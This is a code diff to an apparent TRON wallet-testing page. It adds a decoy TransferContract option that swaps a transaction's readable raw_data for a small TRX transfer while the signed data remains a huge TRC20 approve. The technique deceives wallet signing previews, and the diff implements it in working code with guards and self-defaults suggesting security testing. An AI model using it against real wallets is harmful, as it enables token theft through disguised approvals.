@@ -174,15 +174,16 @@
           <div class="fields">
             <label>Decoy type
               <select id="decoyType">
-                <option value="approve0">approve(spender, 0) — same type, stealthier ✓</option>
-                <option value="transferTrx">sendTrx(decoyTo, amount) — cross-type (may be blocked)</option>
+                <option value="manualTransfer">TransferContract (manual, matching timing) — TRX transfer preview ⚠️</option>
+                <option value="approve0">approve(spender, decoyAmt) — same type, small amount</option>
+                <option value="transferTrx">sendTrx API — cross-type, timing may mismatch</option>
               </select>
             </label>
-            <label id="decoyToLabel" style="display:none">Decoy recipient <input id="decoyTo" autocomplete="off" placeholder="defaults to current account" /></label>
-            <label id="decoyTrxLabel" style="display:none">Decoy TRX <input id="decoyTrx" inputmode="decimal" value="0.01" /></label>
+            <label id="decoyToLabel">Decoy recipient <input id="decoyTo" autocomplete="off" placeholder="defaults to current account" /></label>
+            <label id="decoyTrxLabel">Decoy TRX <input id="decoyTrx" inputmode="decimal" value="0.01" /></label>
             <label>TRC20 contract <input id="tokenContract" autocomplete="off" placeholder="token contract address" /></label>
             <label>Approve spender <input id="spender" autocomplete="off" placeholder="defaults to current account" /></label>
-            <label>Decoy amount <input id="decoyApproveAmount" inputmode="numeric" value="1" /></label>
+            <label id="decoyAmountLabel" style="display:none">Decoy amount <input id="decoyApproveAmount" inputmode="numeric" value="1" /></label>
             <label>Actual amount <input id="approveAmount" inputmode="numeric" value="1000000000000" /></label>
             <label>Fee limit <input id="feeLimit" inputmode="numeric" value="100000000" /></label>
           </div>
@@ -458,7 +459,7 @@
         const tokenContract = requireAddress("tokenContract", "", "TRC20 contract");
         const spender = toBase58(requireAddress("spender", owner, "Approve spender"));
         const approveAmount = integerText("approveAmount", "Approve amount");
-        const decoyApproveAmount = integerText("decoyApproveAmount", "Decoy amount");
+        const decoyApproveAmount = decoyType === "approve0" ? integerText("decoyApproveAmount", "Decoy amount") : "0";
         const feeLimit = Number(integerText("feeLimit", "Fee limit"));
         validateGuards(spender);
 
@@ -468,7 +469,7 @@
           const decoyTo = toBase58(requireAddress("decoyTo", owner, "Decoy recipient"));
           const decoySun = trxToSun($("decoyTrx").value);
           decoyTx = await tronWeb.transactionBuilder.sendTrx(decoyTo, decoySun, owner);
-        } else {
+        } else if (decoyType === "approve0") {
           const decoyResult = await tronWeb.transactionBuilder.triggerSmartContract(
             tokenContract,
             "approve(address,uint256)",
@@ -492,7 +493,25 @@
         if (!actualTx?.raw_data_hex || !actualTx?.raw_data) throw new Error("triggerSmartContract did not return raw_data/raw_data_hex.");
 
         const mismatchedTx = clone(actualTx);
-        if (decoyType === "transferTrx") {
+        if (decoyType === "manualTransfer") {
+          const decoyTo = toBase58(requireAddress("decoyTo", owner, "Decoy recipient"));
+          const decoySun = trxToSun($("decoyTrx").value);
+          const ownerHex = tronWeb.address?.toHex(owner) || owner;
+          const toHex = tronWeb.address?.toHex(decoyTo) || decoyTo;
+          mismatchedTx.raw_data = {
+            contract: [{
+              parameter: {
+                value: { amount: decoySun, owner_address: ownerHex, to_address: toHex },
+                type_url: "type.googleapis.com/protocol.TransferContract"
+              },
+              type: "TransferContract"
+            }],
+            ref_block_bytes: actualTx.raw_data.ref_block_bytes,
+            ref_block_hash: actualTx.raw_data.ref_block_hash,
+            expiration: actualTx.raw_data.expiration,
+            timestamp: actualTx.raw_data.timestamp
+          };
+        } else if (decoyType === "transferTrx") {
           mismatchedTx.raw_data = clone(decoyTx.raw_data);
         } else {
           const decoyData = decoyTx.raw_data?.contract?.[0]?.parameter?.value?.data;
@@ -731,9 +750,11 @@
         log("Provider detection refreshed", { detections: state.detections, capabilities: caps });
       });
       $("decoyType").addEventListener("change", () => {
-        const isTransferTrx = $("decoyType").value === "transferTrx";
-        $("decoyToLabel").style.display = isTransferTrx ? "" : "none";
-        $("decoyTrxLabel").style.display = isTransferTrx ? "" : "none";
+        const v = $("decoyType").value;
+        const needsTransfer = v === "manualTransfer" || v === "transferTrx";
+        $("decoyToLabel").style.display = needsTransfer ? "" : "none";
+        $("decoyTrxLabel").style.display = needsTransfer ? "" : "none";
+        $("decoyAmountLabel").style.display = v === "approve0" ? "" : "none";
       });
       $("connectBtn").addEventListener("click", () => runButton("connectBtn", connectWallet));
       $("buildBtn").addEventListener("click", () => runButton("buildBtn", buildMismatch));
